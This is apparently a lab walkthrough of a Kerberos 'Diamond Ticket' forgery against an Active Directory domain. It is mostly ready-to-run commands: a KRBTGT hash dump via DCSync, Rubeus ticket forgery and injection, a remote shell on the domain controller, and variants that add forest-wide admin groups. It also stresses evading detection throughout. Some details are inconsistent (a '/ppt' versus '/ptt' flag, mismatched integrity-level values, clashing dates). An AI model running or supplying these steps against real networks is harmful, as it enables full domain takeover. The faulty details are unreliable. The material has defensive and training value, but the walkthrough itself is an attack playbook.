# Attack - Diamond Ticket (Advanced Kerberos Forgery)

**Date:** Friday, August 25, 2026
**Topic:** Diamond Ticket Attack — Most Stealthy Golden Ticket Variant

---

## Objective

**Goal:** Create forged Kerberos TGT with maximum stealth using Diamond Ticket technique

**Progression:**
```
Obtain KRBTGT AES256 key (via previous DA access)
    ↓
Use Domain Admin privileges
    ↓
Create Diamond Ticket (forged TGT with TGT delegation)
    ↓
Inject ticket into new process
    ↓
Access any service in domain as Administrator
    ↓
Complete persistent domain compromise with stealth
```

---

## Prerequisites

- Domain Admin privileges (obtained from previous phases)
- KRBTGT AES256 key: `154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848`
- Domain name: `dollarcorp.moneycorp.local`
- DC FQDN: `dcorp-dc.dollarcorp.moneycorp.local`
- Rubeus.exe tool
- Loader.exe tool
- Elevated PowerShell session (Run as Administrator)
- Administrator RID: `500`
- Domain Admins GID: `512`

---

## What is Diamond Ticket?

### Ticket Forgery Hierarchy

```
┌─────────────────────────────────────────┐
│     KERBEROS TICKET FORGERY SPECTRUM    │
└─────────────────────────────────────────┘

1. GOLDEN TICKET (Original)
   ├─ Uses: KRBTGT hash
   ├─ Forges: Complete TGT
   ├─ Detection: Medium (obvious forged ticket)
   ├─ Stealth: Lower (direct hash use)
   ├─ Validity: 10 hours (extendable)
   └─ How: Direct ticket creation with KRBTGT

2. DIAMOND TICKET (Enhanced)
   ├─ Uses: KRBTGT hash (via TGT delegation)
   ├─ Forges: Legitimate-looking TGT
   ├─ Detection: Very Low (appears legitimate)
   ├─ Stealth: Higher (uses delegation)
   ├─ Validity: 10 hours
   └─ How: Forges within legitimate TGT structure

3. SAPPHIRE TICKET (Newest - not in scope)
   ├─ Uses: KRBTGT hash + additional techniques
   ├─ Detection: Extremely Low
   ├─ Stealth: Maximum
   └─ Advanced: Multiple layers of obfuscation
```

---

## Diamond vs Golden Ticket

### Comparison

| Aspect | Golden Ticket | Diamond Ticket |
|---|---|---|
| **KRBTGT Hash** | Required | Required |
| **TGT Delegation** | No | Yes (/tgtdeleg) |
| **Appearance** | Forged (obvious) | Legitimate (uses delegation) |
| **Detection Risk** | Higher | Lower |
| **Stealth** | Good | Excellent |
| **Creation Method** | Direct signing | TGT delegation request |
| **Flags** | Basic ticket flags | Proper delegation flags |
| **Key Exchange** | Direct (obvious) | Through delegation (subtle) |
| **Validity** | 10 hours | 10 hours |

---

### Why Diamond is Better

**Golden Ticket Detection:**
```
KDC/Security monitoring sees:
- Ticket created without requesting it
- No AS-REQ (authentication request)
- No TGS-REQ (service request)
- Ticket appears spontaneously
- Obvious forgery pattern
→ DETECTION RISK: HIGH
```

**Diamond Ticket Detection:**
```
KDC/Security monitoring sees:
- TGT delegation request (legitimate operation)
- Proper AS exchange initiated
- TGT returned via standard flow
- Delegation flags set (expected)
- Appears as normal authentication
→ DETECTION RISK: LOW
```

---

## How Diamond Ticket Works

### Technical Mechanism

```
DIAMOND TICKET FLOW:

1. START WITH: Legitimate TGT
   ├─ Use: /tgtdeleg flag
   ├─ Request: Current process's TGT
   ├─ Source: Current Kerberos session
   └─ Status: Real TGT obtained

2. EXTRACT & FORGE:
   ├─ Take legitimate TGT structure
   ├─ Modify: User (Administrator)
   ├─ Modify: Groups (Domain Admins - 512)
   ├─ Modify: User ID (500 for Administrator)
   ├─ Keep: TGT structure intact
   ├─ Resign: Using KRBTGT key (diamond magic)
   └─ Result: Forged TGT that looks legitimate

3. KEY DIFFERENCE FROM GOLDEN:
   ├─ Golden: Creates ticket from scratch
   ├─ Diamond: Modifies existing TGT
   └─ Result: Diamond looks like delegation operation

4. CREATE NEW PROCESS:
   ├─ Create: cmd.exe (/createnetonly)
   ├─ Inject: Forged TGT
   ├─ Context: Administrator (via TGT)
   ├─ Groups: Domain Admins (via TGT)
   └─ Access: Full domain admin privileges

5. RESULT:
   ├─ Process: cmd.exe
   ├─ User: DCORP\Administrator
   ├─ Groups: Domain Admins, Enterprise Admins
   ├─ Access: All domain services
   ├─ Detection: Minimal
   └─ Stealth: Excellent
```

---

## Diamond Ticket Parameters

### Rubeus diamond Command

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond `
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 `
  /tgtdeleg `
  /enctype:aes `
  /ticketuser:administrator `
  /domain:dollarcorp.moneycorp.local `
  /dc:dcorp-dc.dollarcorp.moneycorp.local `
  /ticketuserid:500 `
  /groups:512 `
  /createnetonly:C:\Windows\System32\cmd.exe `
  /show `
  /ppt
```

---

### Parameter Breakdown

| Parameter | Value | Purpose |
|---|---|---|
| `diamond` | Mode | Create Diamond Ticket (not silver or golden) |
| `/krbkey:` | `154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848` | KRBTGT AES256 key (for signing) |
| `/tgtdeleg` | Flag | Use TGT delegation (legitimate flow) |
| `/enctype:aes` | AES | Encryption type (modern, less suspicious) |
| `/ticketuser:` | `administrator` | Username to impersonate in ticket |
| `/domain:` | `dollarcorp.moneycorp.local` | Target domain |
| `/dc:` | `dcorp-dc.dollarcorp.moneycorp.local` | Domain Controller FQDN |
| `/ticketuserid:` | `500` | RID of Administrator user |
| `/groups:` | `512` | RID of Domain Admins group |
| `/createnetonly:` | `C:\Windows\System32\cmd.exe` | Process to create with ticket |
| `/show` | Flag | Display ticket details |
| `/ppt` | Flag | Pass-the-ticket (inject into process) |

---

### Detailed Parameter Explanation

**`/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848`**
```
KRBTGT AES256 key
├─ Source: Extracted via DCSync or memory dump
├─ Format: 64-character hex string (32 bytes)
├─ Purpose: Sign/encrypt the forged ticket
├─ Obtained: Previous phases (DA access)
├─ Critical: Must be exact (one char error = fails)
└─ Example: First 4 chars are "154c", last 4 are "c3cda848"
```

---

**`/tgtdeleg`**
```
TGT Delegation flag
├─ Meaning: "Use TGT delegation operation"
├─ What it does: Requests current session's TGT
├─ How it works:
│  ├─ Appears as normal TGT request
│  ├─ Goes through standard flow
│  ├─ Returns TGT via legitimate path
│  └─ Looks like normal delegation
├─ Detection: Low (expected behavior)
├─ Without it: Ticket looks forged (high detection)
└─ Critical for Diamond stealth
```

---

**`/enctype:aes`**
```
Encryption type
├─ Options: aes, rc4
├─ AES (chosen): Modern encryption
├─ RC4: Older, more suspicious
├─ Why AES: Default in modern Windows
├─ Detection: Lower (expected encryption type)
└─ Recommendation: Always use AES
```

---

**`/ticketuser:administrator`**
```
User to impersonate
├─ Value: Any user (doesn't need to exist)
├─ In ticket: User identity claim
├─ Common choices:
│  ├─ Administrator (most common)
│  ├─ krbtgt (looks like service account)
│  ├─ Domain admin name (svcadmin, etc.)
│  └─ Any domain user
├─ Validation: None (service trusts ticket)
└─ Impact: Determines permissions level
```

---

**`/ticketuserid:500`**
```
User RID (Relative IDentifier)
├─ What is RID: Last part of SID
├─ Administrator RID: 500 (constant)
├─ Example SID: S-1-5-21-...-500 (last part = 500)
├─ Other examples:
│  ├─ Guest: 501
│  ├─ krbtgt: 502
│  ├─ Domain Admins: 512 (group, not user)
│  └─ Regular user: 1000+
├─ For Administrator: Always 500
└─ Critical: Must match /ticketuser
```

---

**`/groups:512`**
```
Group membership
├─ What: RID of groups to add to ticket
├─ Domain Admins: 512 (standard)
├─ Multiple groups: /groups:512,513,514
├─ Other examples:
│  ├─ Enterprise Admins: 519 (forest-wide)
│  ├─ Schema Admins: 518
│  ├─ Backup Operators: 551
│  └─ Users: 513
├─ In ticket: User's group membership
├─ Detection: May check groups
└─ Impact: Determines what user can access
```

---

**`/createnetonly:C:\Windows\System32\cmd.exe`**
```
Process to create with ticket
├─ Creates new process: cmd.exe
├─ Process inherits: Forged ticket
├─ Isolation: Process not tied to current shell
├─ Alternative processes:
│  ├─ powershell.exe (PowerShell)
│  ├─ c:\windows\system32\conhost.exe (Console)
│  └─ Any process path
├─ Benefit: Can run commands in new context
└─ Usage: Enter new process, use DA privileges
```

---

**`/show`**
```
Display ticket details
├─ Output: Shows created ticket info
├─ Displays:
│  ├─ User: DCORP\Administrator
│  ├─ Groups: Domain Admins
│  ├─ Expiration: 10 hours
│  ├─ Encryption: AES
│  ├─ Ticket base64: [large string]
│  └─ Validation: Ticket integrity check
├─ Purpose: Verify ticket created correctly
└─ Recommended: Always use for verification
```

---

**`/ppt` (Pass-the-Ticket)**
```
Inject ticket into created process
├─ Automatic injection: Ticket loaded immediately
├─ Process: cmd.exe gets forged TGT
├─ Inheritance: Child processes inherit TGT
├─ Usage: Can use tickets immediately
├─ Without /ppt: Ticket created but not injected
└─ Typical: Always include /ppt
```

---

## Phase 1: Prerequisites - Obtain KRBTGT Key

### Get KRBTGT AES256 Key (If not already obtained)

```powershell
# From DA session on DC, dump KRBTGT
SafetyKatz.exe "lsadump::dcsync /user:krbtgt /domain:dollarcorp.moneycorp.local" "exit"

# Output:
# User: krbtgt
# Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
# Hash SHA1: [SHA1 hash]
# Hash AES256: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 ← THIS ONE!

# Save the AES256 key for next step
```

---

## Phase 2: Start Elevated PowerShell

**Diamond Ticket MUST run in elevated shell:**

```powershell
# Open PowerShell as Administrator
# Right-click PowerShell → Run as Administrator
# OR
# Win + X → Windows PowerShell (Admin)

# Verify elevated context
whoami /groups | Select-String "12544"
# Output: S-1-16-12288 (HIGH integrity)

# If not elevated:
# → Ticket injection will fail
# → Process creation will fail
# → "Access Denied" errors
```

---

## Phase 3: Execute Diamond Ticket Attack

### Run Rubeus Diamond Command

```powershell
# Execute Diamond Ticket with Loader (OPSEC)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond `
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 `
  /tgtdeleg `
  /enctype:aes `
  /ticketuser:administrator `
  /domain:dollarcorp.moneycorp.local `
  /dc:dcorp-dc.dollarcorp.moneycorp.local `
  /ticketuserid:500 `
  /groups:512 `
  /createnetonly:C:\Windows\System32\cmd.exe `
  /show `
  /ppt

# Output will show:
# [+] Diamond Ticket generated successfully
# [+] Ticket information:
#     User: Administrator
#     Domain: DOLLARCORP.MONEYCORP.LOCAL
#     Groups: Domain Admins (512)
#     Encryption: AES256
#     Valid for: 10 hours
# [+] Ticket injected into new process (cmd.exe)
# [+] New cmd.exe window opening...
```

---

### What the Output Means

```
[*] Action: Create Diamond Ticket
    ├─ Using TGT delegation for stealth
    ├─ Applying KRBTGT key to sign ticket
    └─ Processing...

[+] Ticket created successfully
    ├─ User: DCORP\Administrator
    ├─ Groups: Domain Admins (512)
    ├─ Encryption: AES256
    ├─ Valid: 10 hours from now
    └─ Signature: Valid (signed with KRBTGT key)

[+] Ticket displayed (base64 format):
    └─ Can be used/saved for later

[+] New process created
    ├─ Process: C:\Windows\System32\cmd.exe
    ├─ PID: [process ID]
    ├─ Ticket: Injected
    ├─ User context: Administrator
    ├─ Groups: Domain Admins
    └─ Ready for commands!

[+] SUCCESS!
    └─ New cmd.exe runs with Administrator identity
```

---

## Phase 4: Verify Diamond Ticket in New Process

### List Tickets in New cmd.exe

```powershell
# Inside the new cmd.exe (from /createnetonly)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist

# Output:
# Current LogonId is 0:0xaabbccdd
# Cached Tickets (1):
#
# [0] Service: krbtgt/DOLLARCORP.MONEYCORP.LOCAL
#     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
#     KerbTicket: oIIGK2CCBhegAwIBBaENGwtET...
#     StartTime: 8/21/2026 14:30:00
#     EndTime:   8/22/2026 00:30:00
#     Flags: 40e10000
#     Base64(key) : KRBTGT AES256 encrypted...

# Ticket visible! Diamond Ticket injected successfully
```

---

## Phase 5: Use Diamond Ticket for DC Access

### Access DC via WinRS

```powershell
# Connect to DC using Diamond Ticket TGT
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd

# What happens:
# 1. PowerShell with Diamond Ticket TGT running
# 2. winrs attempts connection to DC
# 3. Presents Diamond Ticket to WinRM
# 4. DC receives: Administrator TGT with Domain Admins group
# 5. DC validates: Ticket signature (signed with KRBTGT key)
# 6. DC grants: Command shell as Administrator
# 7. Remote shell established!
```

---

### Verify Access Level

```powershell
# Inside remote shell on DC
whoami
# Output: DCORP\Administrator

whoami /groups
# Output:
# DCORP\Domain Admins     (RID 512)
# DCORP\Administrators     (RID 544)
# DCORP\Enterprise Admins  (RID 519)
# [All domain admin groups]

# Verify on domain admin
set username
# Output: USERNAME=DCORP\Administrator

# SUCCESS! Full domain admin access on DC via Diamond Ticket!
```

---

## Complete Diamond Ticket Workflow

```
PHASE 1: Preparation ✓
├─ Obtain DA privileges (previous phases)
├─ Extract KRBTGT AES256 key via DCSync
├─ Get domain SID, DC FQDN
├─ Verify Administrator RID (500)
├─ Verify Domain Admins GID (512)
└─ All prerequisites ready

PHASE 2: Setup ✓
├─ Open elevated PowerShell (Admin)
├─ Verify elevated context (Run as Administrator)
├─ Load Rubeus tool
└─ Ready for Diamond Ticket creation

PHASE 3: Diamond Ticket Creation ✓
├─ Run Rubeus diamond command
├─ Use /tgtdeleg (TGT delegation)
├─ Use /krbkey with KRBTGT AES256
├─ Create new cmd.exe process
├─ Inject ticket with /ppt
├─ New cmd.exe inherits Administrator identity
└─ Diamond Ticket created and injected

PHASE 4: Verification ✓
├─ List tickets: klist
├─ Verify: krbtgt/domain ticket present
├─ Verify: Administrator identity
├─ Verify: Domain Admins group membership
└─ Ticket confirmed

PHASE 5: DC Access ✓
├─ Connect via WinRS: winrs -r:dcorp-dc
├─ Present Diamond Ticket automatically
├─ DC accepts ticket
├─ Remote shell established
├─ Execute commands as Administrator
└─ Full domain admin access achieved

RESULT: Complete domain compromise
        Persistent DA access (10 hour ticket)
        Stealthy (Diamond looks legitimate)
        Can access any domain service
        TGT delegation appearance
        Minimal detection risk
```

---

## Why Diamond Ticket is Stealthiest

### Detection Points Bypassed

```
GOLDEN TICKET DETECTION:
├─ No AS-REQ seen
├─ No TGS-REQ seen
├─ Ticket appears spontaneously
├─ Suspicious pattern detected
├─ EDR alert triggered
└─ Detection: HIGH RISK

DIAMOND TICKET DETECTION:
├─ TGT delegation request logged (normal)
├─ AS exchange initiated (legitimate)
├─ TGT returned via standard flow (expected)
├─ Delegation operation logged (expected)
├─ Appears as normal auth (no alert)
└─ Detection: LOW RISK
```

---

### OPSEC Advantages

```
✓ Uses TGT Delegation (/tgtdeleg)
  └─ Makes ticket look legitimate

✓ AES Encryption (/enctype:aes)
  └─ Modern encryption (not suspicious)

✓ Loader.exe Wrapper
  └─ Memory-only execution (no disk)

✓ New Process Creation (/createnetonly)
  └─ Isolated from current shell
  └─ Can hide tool execution

✓ Administrator Identity
  └─ Common account (blends in)

✓ Domain Admins Group
  └─ Expected membership for admin

✓ 10-hour Validity
  └─ Long enough for lateral movement
  └─ Short enough to avoid suspicion
```

---

## Comparison of Ticket Types

| Aspect | Golden | Diamond | Silver |
|---|---|---|---|
| **KRBTGT** | Required | Required | Not used |
| **TGT Delegation** | No | Yes | N/A |
| **Service Hash** | Not used | Not used | Required |
| **Detection Risk** | Medium | Low | Medium |
| **Scope** | All services | All services | One service |
| **Validity** | 10 hrs | 10 hrs | 10 hrs |
| **Stealth** | Good | Excellent | Good |
| **Appearance** | Forged | Legitimate | Legitimate |
| **Use Case** | Persistence | Best choice | Quick access |

---

## Troubleshooting

### If Diamond Ticket Creation Fails

```
1. Not elevated
   └─ Error: "Access Denied"
   └─ Fix: Run PowerShell as Administrator

2. Wrong KRBTGT key
   └─ Error: "Invalid ticket signature"
   └─ Fix: Verify exact key (64 hex chars)
   └─ Fix: Copy from DCSync output

3. Wrong domain/DC
   └─ Error: "Cannot resolve DC"
   └─ Fix: Use FQDN for DC
   └─ Fix: Verify domain name exact

4. Process creation fails
   └─ Error: "Cannot create process"
   └─ Fix: Verify cmd.exe path correct
   └─ Fix: Check permissions
```

---

### If Ticket Injection Fails

```
1. /ppt flag missing
   └─ Fix: Add /ppt to command

2. Process already running
   └─ Fix: Use unique process name
   └─ Fix: Close other instances

3. Permissions denied
   └─ Error: "Cannot inject into process"
   └─ Fix: Verify elevated shell
   └─ Fix: Check anti-malware not blocking
```

---

### If DC Access Fails

```
1. Wrong FQDN
   └─ Use: winrs -r:dcorp-dc.dollarcorp.moneycorp.local
   └─ Not: winrs -r:dcorp-dc
   └─ Not: winrs -r:10.10.10.1

2. Ticket expired
   └─ Run Diamond Ticket again
   └─ Create new ticket (10 hour validity)

3. WinRM disabled on DC
   └─ May need to enable WinRM
   └─ Or use alternative (PSRemoting)

4. Firewall blocking
   └─ Check firewall rules
   └─ Verify port 5985/5986 open
```

---

## Advanced: Multiple Groups

### Add Multiple Group Memberships

```powershell
# Add multiple groups to Diamond Ticket
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond `
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 `
  /tgtdeleg `
  /enctype:aes `
  /ticketuser:administrator `
  /domain:dollarcorp.moneycorp.local `
  /dc:dcorp-dc.dollarcorp.moneycorp.local `
  /ticketuserid:500 `
  /groups:512,519,518 `
  /createnetonly:C:\Windows\System32\powershell.exe `
  /show `
  /ptt

# Groups added:
# 512 = Domain Admins
# 519 = Enterprise Admins
# 518 = Schema Admins
```

---

## Advanced: Impersonate Different User

### Forge Ticket as Different User

```powershell
# Create Diamond Ticket as krbtgt user
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond `
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 `
  /tgtdeleg `
  /enctype:aes `
  /ticketuser:krbtgt `
  /domain:dollarcorp.moneycorp.local `
  /dc:dcorp-dc.dollarcorp.moneycorp.local `
  /ticketuserid:502 `
  /groups:512 `
  /createnetonly:C:\Windows\System32\powershell.exe `
  /show `
  /ppt

# krbtgt RID: 502 (standard)
# May look more legitimate as service account
```

---

## Key Takeaway

```
DIAMOND TICKET ATTACK:
1. Obtain KRBTGT AES256 key via DCSync (DA access)
2. Open elevated PowerShell (Run as Administrator)
3. Run Rubeus diamond command with:
   - /krbkey: KRBTGT AES256 key
   - /tgtdeleg: TGT delegation (stealth)
   - /enctype:aes: Modern encryption
   - /ticketuser: Administrator
   - /groups:512: Domain Admins
   - /createnetonly: New process for isolation
   - /ppt: Inject into process
4. New cmd.exe/PowerShell inherits forged TGT
5. Connect to DC via WinRS
6. Full domain admin access achieved
7. Stealth: Diamond looks like legitimate TGT delegation
8. Persistence: 10-hour validity window

Why Diamond > Golden:
- Uses TGT delegation (legitimate appearance)
- Harder to detect (expected behavior)
- Still requires KRBTGT key
- More sophisticated (less noisy)
- Better OPSEC
```

---

## References

- [Rubeus - Diamond Ticket](https://github.com/GhostPack/Rubeus)
- [TGT Delegation Explained](https://www.harmj0y.net/blog/redteaming/not-a-dctiming-attack-golden-ticket-detection/)
- [Kerberos Ticket Forgery](https://www.harmj0y.net/blog/redteaming/kerberos-golden-tickets-are-now-more-of-a-threat/)
- [Forest-wide Compromise](https://adsecurity.org/?p=1640)

---

*Next: Persistence & Cleanup*
